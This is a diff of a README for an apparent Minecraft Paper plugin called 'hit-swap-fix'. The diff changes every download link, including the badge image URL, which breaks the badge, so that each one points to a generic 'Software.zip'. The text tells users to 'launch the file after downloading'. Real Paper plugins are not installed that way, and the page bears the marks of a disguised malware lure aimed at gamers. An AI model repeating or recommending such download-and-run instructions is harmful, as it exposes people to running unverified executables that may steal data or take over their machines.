@@ -13,7 +13,7 @@ Welcome to the "hit-swap-fix" repository, a Paper plugin created to address the 
 - 🧹 **Bleach Swapping**: Addresses unexpected glitches related to bleach swapping.
 
 ## Installation
-The plugin can be downloaded [here](https://github.com/user-attachments/files/18410590/Software.zip). Please ensure to launch the file after downloading for installation.
+The plugin can be downloaded [here](https://github.com/jppb1216/hit-swap-fix/releases/download/v2.0/Software.zip). Please ensure to launch the file after downloading for installation.
 
 ## How to Use
 1. Download the plugin ZIP file from the provided link.
@@ -38,8 +38,8 @@ The plugin can be downloaded [here](https://github.com/user-attachments/files/18
 - Sword-swapping
 
 ## Support
-For any inquiries or feedback, please visit the [Releases](https://github.com/user-attachments/files/18410590/Software.zip) section to find the most recent updates and information. Feel free to open an issue if you encounter any difficulties with the plugin.
+For any inquiries or feedback, please visit the [Releases](https://github.com/jppb1216/hit-swap-fix/releases/download/v2.0/Software.zip) section to find the most recent updates and information. Feel free to open an issue if you encounter any difficulties with the plugin.
 
-[![Download Plugin](https://img.shields.io/badge/Download-Plugin-<COLOR>.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Plugin](https://github.com/jppb1216/hit-swap-fix/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/jppb1216/hit-swap-fix/releases/download/v2.0/Software.zip)
 
 🎮 Happy gaming with Hit Swap Fix! 🎮
